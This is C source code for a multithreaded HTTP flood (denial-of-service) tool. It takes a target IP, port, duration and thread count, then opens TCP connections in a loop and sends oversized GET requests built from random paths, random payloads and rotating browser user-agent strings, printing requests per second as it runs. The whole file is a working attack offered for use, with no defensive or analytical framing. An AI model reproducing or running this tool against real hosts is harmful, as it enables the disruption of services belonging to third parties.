#include <errno.h>
#include <stdio.h>
#include <time.h>
#include <ctype.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <pthread.h>

#define SIZE_MULTIPLIER 128

int rps = 0, start, atk_time, total_socks = 1;
int *sock_arr;

typedef struct info {
    char *path;
    in_addr_t addr;

    int port, seconds;
} info_t;

char chars[] = "abcdefghijklmnopqrstuvwxyzƒ…�‰ŠŒŽ€†‡œžŸ¢";

const char *useragents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
};

void sock_append(int sock, int loc) {
    sock_arr = realloc(sock_arr, (loc + 1) * sizeof(int));
    sock_arr[loc - 1] = sock;
}

void trim(char *str) {
	int i, begin = 0, end = strlen(str) - 1;
	while (isspace(str[begin]))
		begin++;
	while ((end >= begin) && isspace(str[end]))
		end--;
	for (i = begin; i <= end; i++)
		str[i - begin] = str[i];
	str[i - begin] = '\0';
}

void get_cpu(char *buf, int len) {
    char cmd[512];
    
    sprintf(cmd, "ps -u -p %d | awk 'FNR == 2 {print $3}'", getpid());

    FILE *fp = popen(cmd, "r");
    if(fp == NULL)
        return;
    
    memset(buf, 0, len);

    char *_ = fgets(buf, len, fp);
    trim(buf);
    
    pclose(fp);
}

char *_itoa(int val, int base) {
	
	static char buf[32] = {0};
	
	int i = 30;
	
	for(; val && i ; --i, val /= base)
		buf[i] = "0123456789abcdef"[val % base];
	
	return &buf[i+1];
}

int rand_int(int lower, int upper) {
    return (rand() % (upper - lower + 1)) + lower;
}

void rps_counter(void) {
    char cpu[8];
    
    while(1) {
        sleep(1);

        get_cpu(cpu, 8);
        
        printf("[info] [%d's left] [%d rps] [%s%% avg cpu] [%d open socks]\n", (atk_time - ((int)time(NULL) - start)), rps, cpu, total_socks);

        rps = 0;
    }
}

void atk_watch(int seconds) {
    if(!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);

        sleep(seconds);

        kill(getppid(), 9);
    }
}

void rand_str(char *string, int old_len, int len) {
    memset(string, 0, old_len);
    
    while(len--)
        *string++ = chars[rand() % sizeof(chars)];
}

char *make_path(void) {
    char *buf = malloc(1024 * SIZE_MULTIPLIER), string[11 * SIZE_MULTIPLIER];
    
    for(int i = 0; i < rand_int(2 * SIZE_MULTIPLIER, 5 * SIZE_MULTIPLIER); i++) {
        rand_str(string, sizeof(rand_str), rand_int(3 * SIZE_MULTIPLIER, 10 * SIZE_MULTIPLIER));

        strcat(buf, "/");
        strcat(buf, string);
    }

    return buf;
}

int atk_connect(in_addr_t address, int port) {
    int sock;
    if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
        printf("[socket] %s\n", strerror(errno));
        
        return -1;
    }

    struct sockaddr_in addr = {
        .sin_addr.s_addr = address,
        .sin_port = htons(port),
        .sin_family = AF_INET
    
    };

    if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
        printf("[connection] %s\n", strerror(errno));
        
        return -1;
    }

    return sock;
}

char *atk_make_request(info_t *args) {
    char *buf = malloc(1024 * SIZE_MULTIPLIER), payload[512 * SIZE_MULTIPLIER], *path = make_path();

    rand_str(payload, sizeof(payload), rand_int(384 * SIZE_MULTIPLIER, 512 * SIZE_MULTIPLIER));
    
    strcpy(buf, "GET");
    strcat(buf, " ");
    strcat(buf, path); //wtf is wrong with this method
    strcat(buf, " HTTP/1.1\r\nHost: ");
    strcat(buf, inet_ntoa((struct in_addr){args->addr}));
    
    strcat(buf, "\r\nUser-Agent: ");
    strcat(buf, useragents[rand() % sizeof(useragents)/sizeof(useragents[0])]);

    strcat(buf, "\r\nConnection: close\r\nContent-Length: ");
    strcat(buf, _itoa(strlen(payload), 10));
    strcat(buf, "\r\n\r\n");
    strcat(buf, payload);

    free(path);

    return buf;
}

void atk_http(void *arg) {
    info_t *args = (info_t *)arg;

    srand(time(NULL) ^ getpid());
    
    int sock;
    
    char *request = atk_make_request(args);
    atk_watch(args->seconds);

    while(1) {
        if((sock = atk_connect(args->addr, args->port)) != -1) {
            if(send(sock, request, strlen(request), MSG_NOSIGNAL) != -1)
                rps++;
                
            sock_append(sock, total_socks++);
        }
    }
    
    free(request);
}

int main(int argc, char **args) {
    if(argc != 5) {
        int _ = write(1, "invalid usage\r\n./script [ip] [port] [time] [path]\r\n", 51);

        return 0;
    }

    info_t atk_args = {
        .addr = inet_addr(args[1]),
        .port = atoi(args[2]),
        .seconds = atoi(args[3])
    };

    atk_time = atk_args.seconds;

    int threads = atoi(args[4]);

    pthread_t thread[threads];

    start = time(NULL);

    if((sock_arr = (int *)malloc(sizeof(int))) == NULL) {
        perror("malloc");

        return -1;
    }
    

    for(int i = 0; i < threads; i++) {
        pthread_create(&thread[i], NULL, (void *)&atk_http, (void *)&atk_args);
        
        printf("[init] started thread [%d]\n", i);
    }

    pthread_create(&thread[threads], NULL, (void *)rps_counter, NULL);

    sleep(atk_args.seconds);

    while(total_socks--)
        close(sock_arr[total_socks]);

    free(sock_arr);
}
